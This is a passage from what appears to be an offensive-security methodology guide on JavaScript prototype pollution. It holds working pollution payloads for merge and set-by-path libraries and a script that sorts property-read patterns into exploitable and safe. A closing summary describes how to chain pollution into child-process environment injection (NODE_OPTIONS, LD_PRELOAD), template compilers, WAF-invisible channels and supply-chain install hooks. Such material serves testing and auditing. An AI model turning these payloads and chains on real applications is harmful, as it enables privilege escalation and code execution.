const merge = require('<candidate-library>');
const clean = {};

// Test 1: __proto__ vector
merge(clean, JSON.parse('{"__proto__":{"polluted_via_proto":"yes"}}'));
console.log('__proto__ vector:', ({}).polluted_via_proto === 'yes' ? 'POLLUTES' : 'safe');

// Test 2: constructor.prototype vector
const clean2 = {};
merge(clean2, JSON.parse('{"constructor":{"prototype":{"polluted_via_ctor":"yes"}}}'));
console.log('constructor.prototype vector:', ({}).polluted_via_ctor === 'yes' ? 'POLLUTES' : 'safe');

// Test 3: nested __proto__
const clean3 = {};
merge(clean3, JSON.parse('{"a":{"__proto__":{"polluted_nested":"yes"}}}'));
console.log('nested __proto__ vector:', ({}).polluted_nested === 'yes' ? 'POLLUTES' : 'safe');
```

Run in an isolated Node process per test to prevent cross-contamination. A library that pollutes on any of the three vectors has the primitive; the specific vector that works determines the payload shape.

**Set-by-path test.** For `lodash.set`, `set-value`, `dset`, and bespoke setPath:
```javascript
const set = require('<candidate-library>');
const target = {};

set(target, '__proto__.polluted_set', 'yes');
console.log('set-by-path __proto__:', ({}).polluted_set === 'yes' ? 'POLLUTES' : 'safe');

set(target, 'constructor.prototype.polluted_ctor_set', 'yes');
console.log('set-by-path constructor.prototype:', ({}).polluted_ctor_set === 'yes' ? 'POLLUTES' : 'safe');
```

**Guard-differential measurement.** After confirming pollution, measure which downstream read patterns see the polluted value:
```javascript
Object.prototype.testKey = 'polluted';
const obj = {};

console.log('property access:', obj.testKey);                    // 'polluted' — EXPLOITABLE
console.log('optional chain:', obj?.testKey);                     // 'polluted' — EXPLOITABLE
console.log('in operator:', 'testKey' in obj);                    // true — EXPLOITABLE
console.log('for..in:', [...(function*(){for(let k in obj) yield k})()]); // ['testKey'] — EXPLOITABLE
console.log('Object.hasOwn:', Object.hasOwn(obj, 'testKey'));     // false — SAFE
console.log('hasOwnProperty:', obj.hasOwnProperty('testKey'));    // false — SAFE
console.log('Object.keys:', Object.keys(obj));                    // [] — SAFE
console.log('JSON.stringify:', JSON.stringify(obj));               // '{}' — SAFE
console.log('Reflect.ownKeys:', Reflect.ownKeys(obj));            // [] — SAFE

delete Object.prototype.testKey;
```

The exploitable vs safe split tells you which downstream patterns are sinks. An app that gates auth on `Object.hasOwn(user, 'isAdmin')` is safe; one that uses `user.isAdmin` is exploitable.

**Version-boundary measurement.** When the target's exact dependency version is uncertain, install both the last-known-vulnerable and first-patched versions side-by-side and run the matrix against each. The differential identifies the exact fix boundary. Persist the measurement results for the finding report — "measured on `<lib>@<version>`: `<result>`" is stronger evidence than "CVE-XXXX says."

**Automation.** For lockfile-scale measurement (100+ dependencies), script the matrix test in a Docker container per dependency, running each in an isolated process. Output: a table of `{package, version, __proto__: POLLUTES|safe, constructor: POLLUTES|safe}` — the target's pollution-primitive inventory.

## Summary

Prototype pollution's advanced exploitation surface is the parser-merge-sink differential — the parser accepts the payload, the merge walks into `__proto__` or `constructor.prototype`, and the sink lifts the polluted key into a security-sensitive operation. On modern-patched mainstream libraries the pollution primitive is usually a bespoke `for..in` copy, a legacy pinned package, or a small-utility-family dependency; the sink lands in `child_process` env-spread (still current across all Node versions), template compile options (ejs/pug/handlebars/lodash.template), client-side script loaders, or the newer undici dispatcher/fetch constructor surfaces. The structured-clone/JSON/assign copy primitives are safe in isolation — the vulnerability is always the downstream merge that walks into the own-property `__proto__`. Confirm blind via boolean auth-flip or timing baseline; construct composite chains by picking the polluted key to match a known downstream sink; enumerate merge points with the grep patterns and dependency-tree scanner above rather than assuming a specific library-name catalog; and extend the surface to build-system sinks (webpack/vite/esbuild config pollution affecting production bundles), micro-frontend shared scopes (Module Federation shared-scope pollution crossing application boundaries), binary serialization formats (protobuf Struct, MessagePack, CBOR — WAF-invisible delivery channels), ES2024+ API read surfaces (`Promise.withResolvers` return, ad-hoc iterator `next`, Temporal constructor inputs), cross-runtime env-variable taxonomy (NODE_OPTIONS, LD_PRELOAD, GIT_SSH_COMMAND, RUBYOPT, JAVA_TOOL_OPTIONS per child-process type), and supply-chain install-time pollution (postinstall scripts, lockfile injection, transitive dependency pinning, CI build-cache persistence) when the target's architecture includes those components.
